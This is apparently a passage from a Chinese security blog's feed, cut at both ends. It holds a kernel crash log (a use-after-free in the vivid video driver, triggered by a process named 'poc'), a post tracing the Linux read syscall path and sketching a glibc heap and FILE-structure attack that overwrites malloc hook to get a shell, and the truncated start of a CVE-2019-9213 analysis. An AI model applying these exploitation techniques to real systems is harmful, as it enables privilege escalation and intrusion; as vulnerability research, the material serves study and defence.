class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line">[   51.334790] ------------[ cut here ]------------</span><br><span class="line">[   51.335853] WARNING: CPU: 1 PID: 298 at drivers/media/common/videobuf2/videobuf2-core.c:1882 __vb2_queue_cancel.cold+0x11/0x212</span><br><span class="line">[   51.337830] Modules linked in:</span><br><span class="line">[   51.338383] CPU: 1 PID: 298 Comm: poc Not tainted 5.3.8 #3</span><br><span class="line">[   51.339360] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS ?-20191223_100556-anatol 04/01/2014</span><br><span class="line">[   51.341072] RIP: 0010:__vb2_queue_cancel.cold+0x11/0x212</span><br><span class="line">[   51.342023] Code: 50 a1 fe e9 6d ff ff ff e8 90 50 a1 fe e9 fc fe ff ff e8 86 50 a1 fe eb b5 e8 bf 7a 79 fe 48 c7 c7 20 46 20 84 e8 cc 11 64 fe &lt;0f&gt; 0b 8</span><br><span class="line">[   51.345211] RSP: 0018:ffff888064807cb8 EFLAGS: 00010282</span><br><span class="line">[   51.346130] RAX: 0000000000000024 RBX: 0000000000000001 RCX: 0000000000000000</span><br><span class="line">[   51.347365] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffffed100c900f89</span><br><span class="line">[   51.348611] RBP: ffff8880699963c4 R08: 0000000000000024 R09: ffffed100da25de0</span><br><span class="line">[   51.349843] R10: ffffed100da25ddf R11: ffff88806d12eeff R12: ffff888069996458</span><br><span class="line">[   51.351081] R13: ffff888069996460 R14: ffff888069996180 R15: ffff88806a254500</span><br><span class="line">[   51.352327] FS:  00007ff7ba809700(0000) GS:ffff88806d100000(0000) knlGS:0000000000000000</span><br><span class="line">[   51.353717] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[   51.354714] CR2: 00007ff7ba808e78 CR3: 0000000069d96000 CR4: 00000000000006e0</span><br><span class="line">[   51.355949] Call Trace:</span><br><span class="line">[   51.356403]  vb2_core_streamoff+0x59/0x140</span><br><span class="line">[   51.357150]  __vb2_cleanup_fileio+0x70/0x160</span><br><span class="line">[   51.357905]  vb2_core_queue_release+0x1a/0x70</span><br><span class="line">[   51.358679]  _vb2_fop_release+0x1c1/0x280</span><br><span class="line">[   51.359397]  vivid_fop_release+0x18b/0x430</span><br><span class="line">[   51.360131]  ? vivid_dev_release+0x1b0/0x1b0</span><br><span class="line">[   51.360887]  ? dev_debug_store+0x100/0x100</span><br><span class="line">[   51.361613]  v4l2_release+0x2cc/0x370</span><br><span class="line">[   51.362278]  ? dev_debug_store+0x100/0x100</span><br><span class="line">[   51.363009]  __fput+0x2da/0x850</span><br><span class="line">[   51.363587]  task_work_run+0x144/0x1c0</span><br><span class="line">[   51.364270]  exit_to_usermode_loop+0x1d2/0x200</span><br><span class="line">[   51.365058]  do_syscall_64+0x465/0x580</span><br><span class="line">[   51.365746]  entry_SYSCALL_64_after_hwframe+0x49/0xbe</span><br><span class="line">[   51.366634] RIP: 0033:0x404ff1</span><br><span class="line">[   51.367187] Code: 75 14 b8 03 00 00 00 0f 05 48 3d 01 f0 ff ff 0f 83 34 5e 00 00 c3 48 83 ec 08 e8 6a fc ff ff 48 89 04 24 b8 03 00 00 00 0f 05 &lt;48&gt; 8b 1</span><br><span class="line">[   51.370438] RSP: 002b:00007ff7ba808d00 EFLAGS: 00000293 ORIG_RAX: 0000000000000003</span><br><span class="line">[   51.371782] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 0000000000404ff1</span><br><span class="line">[   51.373034] RDX: fffffffffffffff0 RSI: 00007ff7bb00b000 RDI: 0000000000000004</span><br><span class="line">[   51.374265] RBP: 00007ff7ba808dd0 R08: 0000000000000001 R09: 0000000000000026</span><br><span class="line">[   51.375473] R10: 0000000000000000 R11: 0000000000000293 R12: 00007ffd63d69cce</span><br><span class="line">[   51.376654] R13: 00007ffd63d69ccf R14: 00007ff7ba009000 R15: 0000000000000003</span><br><span class="line">[   51.377824] irq event stamp: 144</span><br><span class="line">[   51.378369] hardirqs last  enabled at (143): [&lt;ffffffff812892c8&gt;] console_unlock+0x8f8/0xc40</span><br><span class="line">[   51.379723] hardirqs last disabled at (144): [&lt;ffffffff8100430a&gt;] trace_hardirqs_off_thunk+0x1a/0x20</span><br><span class="line">[   51.381148] softirqs last  enabled at (140): [&lt;ffffffff83c0065f&gt;] __do_softirq+0x65f/0x924</span><br><span class="line">[   51.382441] softirqs last disabled at (133): [&lt;ffffffff81159038&gt;] irq_exit+0x178/0x1a0</span><br><span class="line">[   51.383683] ---[ end trace 9ff69050999e0cbd ]---</span><br><span class="line">[   51.384474] videobuf2_common: driver bug: stop_streaming operation is leaving buf 0000000026272a93 in active state</span><br><span class="line">[   51.387999] ==================================================================</span><br><span class="line">[   51.389187] BUG: KASAN: use-after-free in vid_cap_buf_queue+0x191/0x1c0</span><br><span class="line">[   51.390158] Write of size 8 at addr ffff88806a0b1a20 by task poc/298</span><br><span class="line">[   51.391125] </span><br><span class="line">[   51.391365] CPU: 1 PID: 298 Comm: poc Tainted: G        W         5.3.8 #3</span><br><span class="line">[   51.392373] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS ?-20191223_100556-anatol 04/01/2014</span><br><span class="line">[   51.393745] Call Trace:</span><br><span class="line">[   51.394115]  dump_stack+0xca/0x13e</span><br><span class="line">[   51.394614]  print_address_description+0x62/0x31e</span><br><span class="line">[   51.395288]  ? vid_cap_buf_queue+0x191/0x1c0</span><br><span class="line">[   51.395902]  ? vid_cap_buf_queue+0x191/0x1c0</span><br><span class="line">[   51.396512]  __kasan_report.cold+0x1a/0x40</span><br><span class="line">[   51.397099]  ? vid_cap_buf_queue+0x191/0x1c0</span><br><span class="line">[   51.397711]  kasan_report+0xe/0x12</span><br><span class="line">[   51.398192]  vid_cap_buf_queue+0x191/0x1c0</span><br><span class="line">[   51.398789]  ? vid_cap_buf_request_complete+0xa0/0xa0</span><br><span class="line">[   51.399492]  __enqueue_in_driver+0x13f/0x390</span><br><span class="line">[   51.400081]  vb2_start_streaming+0x62/0x2d0</span><br><span class="line">[   51.400658]  vb2_core_streamon+0x1c5/0x2b0</span><br><span class="line">[   51.401225]  __vb2_init_fileio+0x97d/0xba0</span><br><span class="line">[   51.401790]  __vb2_perform_fileio+0xbab/0x10c0</span><br><span class="line">[   51.402421]  ? fsnotify+0x786/0xb20</span><br><span class="line">[   51.402912]  ? __fsnotify_parent+0xd1/0x370</span><br><span class="line">[   51.403493]  ? vb2_thread_start+0x360/0x360</span><br><span class="line">[   51.404082]  ? fsnotify_first_mark+0x200/0x200</span><br><span class="line">[   51.404704]  vb2_fop_read+0x20e/0x400</span><br><span class="line">[   51.405220]  v4l2_read+0x1f4/0x270</span><br><span class="line">[   51.405727]  ? v4l2_write+0x270/0x270</span><br><span class="line">[   51.406234]  __vfs_read+0x7c/0x100</span><br><span class="line">[   51.406712]  vfs_read+0x1ef/0x430</span><br><span class="line">[   51.407202]  ksys_read+0x127/0x250</span><br><span class="line">[   51.407673]  ? kernel_write+0x120/0x120</span><br><span class="line">[   51.408221]  ? __ia32_sys_nanosleep_time32+0x220/0x220</span><br><span class="line">[   51.408976]  ? trace_hardirqs_off_caller+0x55/0x1e0</span><br><span class="line">[   51.409701]  do_syscall_64+0xbd/0x580</span><br><span class="line">[   51.410290]  entry_SYSCALL_64_after_hwframe+0x49/0xbe</span><br><span class="line">[   51.411076] RIP: 0033:0x404f91</span><br><span class="line">[   51.411562] Code: 75 14 b8 00 00 00 00 0f 05 48 3d 01 f0 ff ff 0f 83 94 5e 00 00 c3 48 83 ec 08 e8 ca fc ff ff 48 89 04 24 b8 00 00 00 00 0f 05 &lt;48&gt; 8b 1</span><br><span class="line">[   51.414332] RSP: 002b:00007ff7ba808d00 EFLAGS: 00000293 ORIG_RAX: 0000000000000000</span><br><span class="line">[   51.415492] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000404f91</span><br><span class="line">[   51.416578] RDX: 0000000000fffded RSI: 00007ff7bb00b000 RDI: 0000000000000003</span><br><span class="line">[   51.417686] RBP: 00007ff7ba808dd0 R08: 0000000000000001 R09: 0000000000000026</span><br><span class="line">[   51.418823] R10: 0000000000000000 R11: 0000000000000293 R12: 00007ffd63d69cce</span><br><span class="line">[   51.419919] R13: 00007ffd63d69ccf R14: 00007ff7ba009000 R15: 0000000000000003</span><br><span class="line">[   51.421030] </span><br><span class="line">[   51.421287] Allocated by task 297:</span><br><span class="line">[   51.421851]  save_stack+0x1b/0x80</span><br><span class="line">[   51.422390]  __kasan_kmalloc.constprop.0+0xc2/0xd0</span><br><span class="line">[   51.423155]  __vb2_queue_alloc+0xe8/0xf20</span><br><span class="line">[   51.423816]  vb2_core_reqbufs+0x495/0xcf0</span><br><span class="line">[   51.424455]  __vb2_init_fileio+0x33b/0xba0</span><br><span class="line">[   51.425102]  __vb2_perform_fileio+0xbab/0x10c0</span><br><span class="line">[   51.425812]  vb2_fop_read+0x20e/0x400</span><br><span class="line">[   51.426394]  v4l2_read+0x1f4/0x270</span><br><span class="line">[   51.426934]  __vfs_read+0x7c/0x100</span><br><span class="line">[   51.427481]  vfs_read+0x1ef/0x430</span><br><span class="line">[   51.428016]  ksys_read+0x127/0x250</span><br><span class="line">[   51.428566]  do_syscall_64+0xbd/0x580</span><br><span class="line">[   51.429150]  entry_SYSCALL_64_after_hwframe+0x49/0xbe</span><br><span class="line">[   51.429930] </span><br><span class="line">[   51.430183] Freed by task 298:</span><br><span class="line">[   51.430674]  save_stack+0x1b/0x80</span><br><span class="line">[   51.431191]  __kasan_slab_free+0x12c/0x170</span><br><span class="line">[   51.431826]  kfree+0xd2/0x2d0</span><br><span class="line">[   51.432308]  __vb2_queue_free+0x501/0x870</span><br><span class="line">[   51.432941]  vb2_core_reqbufs+0x212/0xcf0</span><br><span class="line">[   51.433571]  __vb2_cleanup_fileio+0xed/0x160</span><br><span class="line">[   51.434241]  vb2_core_queue_release+0x1a/0x70</span><br><span class="line">[   51.434920]  _vb2_fop_release+0x1c1/0x280</span><br><span class="line">[   51.435579]  vivid_fop_release+0x18b/0x430</span><br><span class="line">[   51.436223]  v4l2_release+0x2cc/0x370</span><br><span class="line">[   51.436804]  __fput+0x2da/0x850</span><br><span class="line">[   51.437306]  task_work_run+0x144/0x1c0</span><br><span class="line">[   51.437897]  exit_to_usermode_loop+0x1d2/0x200</span><br><span class="line">[   51.438609]  do_syscall_64+0x465/0x580</span><br><span class="line">[   51.439206]  entry_SYSCALL_64_after_hwframe+0x49/0xbe</span><br><span class="line">[   51.439991] </span><br><span class="line">[   51.440273] The buggy address belongs to the object at ffff88806a0b1680</span><br><span class="line">[   51.440273]  which belongs to the cache kmalloc-1k of size 1024</span><br><span class="line">[   51.442207] The buggy address is located 928 bytes inside of</span><br><span class="line">[   51.442207]  1024-byte region [ffff88806a0b1680, ffff88806a0b1a80)</span><br><span class="line">[   51.443943] The buggy address belongs to the page:</span><br><span class="line">[   51.444675] page:ffffea0001a82c00 refcount:1 mapcount:0 mapping:ffff88806c802280 index:0x0 compound_mapcount: 0</span><br><span class="line">[   51.446186] flags: 0x100000000010200(slab|head)</span><br><span class="line">[   51.446870] raw: 0100000000010200 ffffea0001a75c00 0000000400000004 ffff88806c802280</span><br><span class="line">[   51.448026] raw: 0000000000000000 00000000800e000e 00000001ffffffff 0000000000000000</span><br><span class="line">[   51.449192] page dumped because: kasan: bad access detected</span><br><span class="line">[   51.450017] </span><br><span class="line">[   51.450262] Memory state around the buggy address:</span><br><span class="line">[   51.450990]  ffff88806a0b1900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb</span><br><span class="line">[   51.452085]  ffff88806a0b1980: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb</span><br><span class="line">[   51.453169] &gt;ffff88806a0b1a00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb</span><br><span class="line">[   51.454254]                                ^</span><br><span class="line">[   51.454907]  ffff88806a0b1a80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc</span><br><span class="line">[   51.456007]  ffff88806a0b1b00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb</span><br><span class="line">[   51.457111] ==================================================================</span><br><span class="line">[   51.458188] Disabling lock debugging due to kernel taint</span><br><span class="line">[   51.461635] BUG: kernel NULL pointer dereference, address: 0000000000000000</span><br><span class="line">[   51.462904] #PF: supervisor write access in kernel mode</span><br><span class="line">[   51.463887] #PF: error_code(0x0002) - not-present page</span><br><span class="line">[   51.464855] PGD 6a2d6067 P4D 6a2d6067 PUD 67a9f067 PMD 0 </span><br><span class="line">[   51.465775] Oops: 0002 [#1] SMP KASAN NOPTI</span><br><span class="line">[   51.466412] CPU: 1 PID: 300 Comm: vivid-000-vid-c Tainted: G    B   W         5.3.8 #3</span><br><span class="line">[   51.467598] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS ?-20191223_100556-anatol 04/01/2014</span><br><span class="line">[   51.469075] RIP: 0010:memcpy_orig+0x29/0x110</span><br><span class="line">[   51.469734] Code: 00 48 89 f8 48 83 fa 20 72 7e 40 38 fe 7c 35 48 83 ea 20 48 83 ea 20 4c 8b 06 4c 8b 4e 08 4c 8b 56 10 4c 8b 5e 18 48 8d 76 20 &lt;4c&gt; 89 3</span><br><span class="line">[   51.472507] RSP: 0018:ffff888063d97930 EFLAGS: 00010206</span><br><span class="line">[   51.473327] RAX: 0000000000000000 RBX: dffffc0000000000 RCX: ffffffff82c3a4ac</span><br><span class="line">[   51.474474] RDX: 00000000000004c0 RSI: ffffc90000061020 RDI: 0000000000000000</span><br><span class="line">[   51.475585] RBP: ffffc90000061000 R08: 80b380b380b380b3 R09: 80b380b380b380b3</span><br><span class="line">[   51.476641] R10: 80b380b380b380b3 R11: 80b380b380b380b3 R12: ffffc90000061000</span><br><span class="line">[   51.477689] R13: 0000000000000500 R14: ffff888069995aa0 R15: ffffc90000061000</span><br><span class="line">[   51.478774] FS:  0000000000000000(0000) GS:ffff88806d100000(0000) knlGS:0000000000000000</span><br><span class="line">[   51.479959] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[   51.480816] CR2: 0000000000000000 CR3: 0000000069d96000 CR4: 00000000000006e0</span><br><span class="line">[   51.481870] Call Trace:</span><br><span class="line">[   51.482264]  tpg_fill_plane_buffer+0x1afc/0x2f90</span><br><span class="line">[   51.482963]  vivid_fillbuff+0x1886/0x3d10</span><br><span class="line">[   51.483577]  ? finish_task_switch+0x126/0x5f0</span><br><span class="line">[   51.484243]  ? vivid_grab_controls+0x380/0x380</span><br><span class="line">[   51.484914]  ? __mutex_lock+0x535/0x1300</span><br><span class="line">[   51.485509]  ? lock_downgrade+0x720/0x720</span><br><span class="line">[   51.486108]  ? lockdep_hardirqs_on+0x580/0x580</span><br><span class="line">[   51.486777]  ? vivid_thread_vid_cap_tick+0xb9c/0x1f40</span><br><span class="line">[   51.487541]  ? lock_downgrade+0x720/0x720</span><br><span class="line">[   51.488154]  ? do_raw_spin_lock+0x11b/0x280</span><br><span class="line">[   51.488793]  ? rwlock_bug.part.0+0x90/0x90</span><br><span class="line">[   51.489410]  ? vivid_thread_vid_cap_tick+0x735/0x1f40</span><br><span class="line">[   51.490172]  vivid_thread_vid_cap_tick+0x735/0x1f40</span><br><span class="line">[   51.490925]  ? kvm_clock_get_cycles+0x14/0x20</span><br><span class="line">[   51.491580]  vivid_thread_vid_cap+0x2f2/0x970</span><br><span class="line">[   51.492246]  ? vivid_thread_vid_cap_tick+0x1f40/0x1f40</span><br><span class="line">[   51.493018]  kthread+0x31b/0x420</span><br><span class="line">[   51.493512]  ? kthread_create_on_node+0xf0/0xf0</span><br><span class="line">[   51.494191]  ? kthread_create_on_node+0xf0/0xf0</span><br><span class="line">[   51.494866]  ret_from_fork+0x27/0x50</span><br><span class="line">[   51.495411] Modules linked in:</span><br><span class="line">[   51.495879] CR2: 0000000000000000</span><br><span class="line">[   51.496387] ---[ end trace 9ff69050999e0cbe ]---</span><br><span class="line">[   51.497108] RIP: 0010:memcpy_orig+0x29/0x110</span><br><span class="line">[   51.497788] Code: 00 48 89 f8 48 83 fa 20 72 7e 40 38 fe 7c 35 48 83 ea 20 48 83 ea 20 4c 8b 06 4c 8b 4e 08 4c 8b 56 10 4c 8b 5e 18 48 8d 76 20 &lt;4c&gt; 89 3</span><br><span class="line">[   51.500647] RSP: 0018:ffff888063d97930 EFLAGS: 00010206</span><br><span class="line">[   51.501465] RAX: 0000000000000000 RBX: dffffc0000000000 RCX: ffffffff82c3a4ac</span><br><span class="line">[   51.502583] RDX: 00000000000004c0 RSI: ffffc90000061020 RDI: 0000000000000000</span><br><span class="line">[   51.503699] RBP: ffffc90000061000 R08: 80b380b380b380b3 R09: 80b380b380b380b3</span><br><span class="line">[   51.504801] R10: 80b380b380b380b3 R11: 80b380b380b380b3 R12: ffffc90000061000</span><br><span class="line">[   51.505922] R13: 0000000000000500 R14: ffff888069995aa0 R15: ffffc90000061000</span><br><span class="line">[   51.507044] FS:  0000000000000000(0000) GS:ffff88806d100000(0000) knlGS:0000000000000000</span><br><span class="line">[   51.508290] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[   51.509187] CR2: 0000000000000000 CR3: 0000000069d96000 CR4: 00000000000006e0</span><br><span class="line">[   51.510296] BUG: sleeping function called from invalid context at include/linux/percpu-rwsem.h:38</span><br><span class="line">[   51.511667] in_atomic(): 0, irqs_disabled(): 1, pid: 300, name: vivid-000-vid-c</span><br><span class="line">[   51.512797] INFO: lockdep is turned off.</span><br><span class="line">[   51.513416] irq event stamp: 0</span><br><span class="line">[   51.513919] hardirqs last  enabled at (0): [&lt;0000000000000000&gt;] 0x0</span><br><span class="line">[   51.514908] hardirqs last disabled at (0): [&lt;ffffffff81137860&gt;] copy_process+0x1550/0x6940</span><br><span class="line">[   51.516201] softirqs last  enabled at (0): [&lt;ffffffff81137901&gt;] copy_process+0x15f1/0x6940</span><br><span class="line">[   51.517474] softirqs last disabled at (0): [&lt;0000000000000000&gt;] 0x0</span><br><span class="line">[   51.518447] CPU: 1 PID: 300 Comm: vivid-000-vid-c Tainted: G    B D W         5.3.8 #3</span><br><span class="line">[   51.519688] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS ?-20191223_100556-anatol 04/01/2014</span><br><span class="line">[   51.521181] Call Trace:</span><br><span class="line">[   51.521584]  dump_stack+0xca/0x13e</span><br><span class="line">[   51.522132]  ___might_sleep.cold+0x10f/0x129</span><br><span class="line">[   51.522812]  exit_signals+0x75/0x920</span><br><span class="line">[   51.523387]  ? do_signal_stop+0x840/0x840</span><br><span class="line">[   51.524049]  do_exit+0x28b/0x2b30</span><br><span class="line">[   51.524582]  ? vivid_thread_vid_cap+0x2f2/0x970</span><br><span class="line">[   51.525299]  ? mm_update_next_owner+0x630/0x630</span><br><span class="line">[   51.526029]  ? vivid_thread_vid_cap_tick+0x1f40/0x1f40</span><br><span class="line">[   51.526843]  ? kthread+0x31b/0x420</span><br><span class="line">[   51.527388]  rewind_stack_do_exit+0x17/0x20</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      这里分析一下cve-2019-18686
    
    </summary>
    
    
    
      <category term="linux kernel,cve" scheme="http://yoursite.com/tags/linux-kernel-cve/"/>
    
  </entry>
  
  <entry>
    <title>FILE Structure exploit</title>
    <link href="http://yoursite.com/2020/03/30/FILE-Structure-exploit/"/>
    <id>http://yoursite.com/2020/03/30/FILE-Structure-exploit/</id>
    <published>2020-03-30T02:43:12.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这几天在看ctftime看一篇writeup时候，看到一篇论文学到了一些新姿势总结一下</p><p>writeup链接：</p><ul><li><a href="https://philomath213.github.io/post/angstromctf2020-bookface/" target="_blank" rel="noopener">https://philomath213.github.io/post/angstromctf2020-bookface/</a></li></ul><p>论文链接：</p><ul><li><a href="https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf" target="_blank" rel="noopener">https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf</a></li></ul><h1 id="0x01-文件流"><a href="#0x01-文件流" class="headerlink" title="0x01 文件流"></a>0x01 文件流</h1><p>当你想利用read()函数，write（）函数从文件写入或者读出一些内容的时候，并不是立即写到文件里面的，而是，先写到一个kernel buf，当kernel buf满的时候，才会一次性写到文件中。</p><p>而你用fread()或者fwrite()读写文件的时候，并不会直接读写到kernel buf里面，而是在libc里面有一块buf，当buf满的时候，才会调用read()或者write（）读写kernel buf，那么问题来了，这个kernel buf是不是一个固定的位置呢，还是kmalloc出来的呢，如果是固定的，是不是可以作为一个kernel exploit的一个跳板，</p><p>然后这就需要追踪kernel sys_read和sys_write的实现，linux syscall定义于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include/linux/syscalls.h</span><br></pre></td></tr></table></figure><p>然后搜索 <strong>sys_read</strong> 然后发现定义于 <strong>fs/read_write.c</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/* fs/read_write.c */</span><br><span class="line">asmlinkage long sys_llseek(unsigned int fd, unsigned long offset_high,</span><br><span class="line">unsigned long offset_low, loff_t __user *result,</span><br><span class="line">unsigned int whence);</span><br><span class="line">asmlinkage long sys_lseek(unsigned int fd, off_t offset,</span><br><span class="line">  unsigned int whence);</span><br><span class="line">asmlinkage long sys_read(unsigned int fd, char __user *buf, size_t count);</span><br><span class="line">asmlinkage long sys_write(unsigned int fd, const char __user *buf,</span><br><span class="line">  size_t count);</span><br></pre></td></tr></table></figure><p>在 <strong>fs/read_write.c</strong> 中继续搜索 <strong>sys_read</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)</span><br><span class="line">&#123;</span><br><span class="line">return ksys_read(fd, buf, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现调用了ksys_read</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count)</span><br><span class="line">&#123;</span><br><span class="line">struct fd f = fdget_pos(fd);</span><br><span class="line">ssize_t ret = -EBADF;</span><br><span class="line"></span><br><span class="line">if (f.file) &#123;</span><br><span class="line">loff_t pos, *ppos = file_ppos(f.file);</span><br><span class="line">if (ppos) &#123;</span><br><span class="line">pos = *ppos;</span><br><span class="line">ppos = &amp;pos;</span><br><span class="line">&#125;</span><br><span class="line">ret = vfs_read(f.file, buf, count, ppos);</span><br><span class="line">if (ret &gt;= 0 &amp;&amp; ppos)</span><br><span class="line">f.file-&gt;f_pos = pos;</span><br><span class="line">fdput_pos(f);</span><br><span class="line">&#125;</span><br><span class="line">return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到ksys_read函数首先取得当前文件的偏移，然后调用vfs_read()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)</span><br><span class="line">&#123;</span><br><span class="line">ssize_t ret;</span><br><span class="line"></span><br><span class="line">if (!(file-&gt;f_mode &amp; FMODE_READ))</span><br><span class="line">return -EBADF;</span><br><span class="line">if (!(file-&gt;f_mode &amp; FMODE_CAN_READ))</span><br><span class="line">return -EINVAL;</span><br><span class="line">if (unlikely(!access_ok(buf, count)))</span><br><span class="line">return -EFAULT;</span><br><span class="line"></span><br><span class="line">ret = rw_verify_area(READ, file, pos, count);</span><br><span class="line">if (!ret) &#123;</span><br><span class="line">if (count &gt; MAX_RW_COUNT)</span><br><span class="line">count =  MAX_RW_COUNT;</span><br><span class="line">ret = __vfs_read(file, buf, count, pos);</span><br><span class="line">if (ret &gt; 0) &#123;</span><br><span class="line">fsnotify_access(file);</span><br><span class="line">add_rchar(current, ret);</span><br><span class="line">&#125;</span><br><span class="line">inc_syscr(current);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数主要是检查权限，然后调用 <strong>__vfs_read</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ssize_t __vfs_read(struct file *file, char __user *buf, size_t count,</span><br><span class="line">   loff_t *pos)</span><br><span class="line">&#123;</span><br><span class="line">if (file-&gt;f_op-&gt;read)</span><br><span class="line">return file-&gt;f_op-&gt;read(file, buf, count, pos);</span><br><span class="line">else if (file-&gt;f_op-&gt;read_iter)</span><br><span class="line">return new_sync_read(file, buf, count, pos);</span><br><span class="line">else</span><br><span class="line">return -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后发现他根据不同的文件类型调用read(),然后，就得找不同类型的文件，去找read()函数,我在 <strong>/fs/ext4/file.c</strong> 里面找到实现的read函数，并没有找到buf 23333</p><p>由于还没有想法去验证，待补</p><h1 id="0x02-新姿势"><a href="#0x02-新姿势" class="headerlink" title="0x02 新姿势"></a>0x02 新姿势</h1><p>利用unsorted bin attack的任意地址写libc，高libc版本可以用small attack那个任意地址写libc，去修改stdin 结构体IO_buf_end，这样的话，stdin的buf范围为IO_buf_end到main_arena中unsorted bin链表的位置，可以直接写malloc hook从而实现开shell，我觉得高版本的libc small bin attack更为强大，因为他能修改top chunk的指针，从而实现任意地址malloc，有点强大</p>]]></content>
    
    <summary type="html">
    
      在看一篇文章的时候，学到了一些新姿势，总结一下
    
    </summary>
    
    
    
      <category term="linux kernel,pwn" scheme="http://yoursite.com/tags/linux-kernel-pwn/"/>
    
  </entry>
  
  <entry>
    <title>cve-2019-9213</title>
    <link href="http://yoursite.com/2020/03/26/cve-2019-9213/"/>
    <id>http://yoursite.com/2020/03/26/cve-2019-9213/</id>
    <published>2020-03-26T07:12:27.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在安全客看到这个cve，比较有意思。这个漏洞虽然不能提权，但是，可以在0页分配内存，可以作为辅助漏洞，在linux 4.20.14之前都有效。</p><h1 id="0x01-poc分析"><a href="#0x01-poc分析" class="headerlink" title="0x01 poc分析"></a>0x01 poc分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include 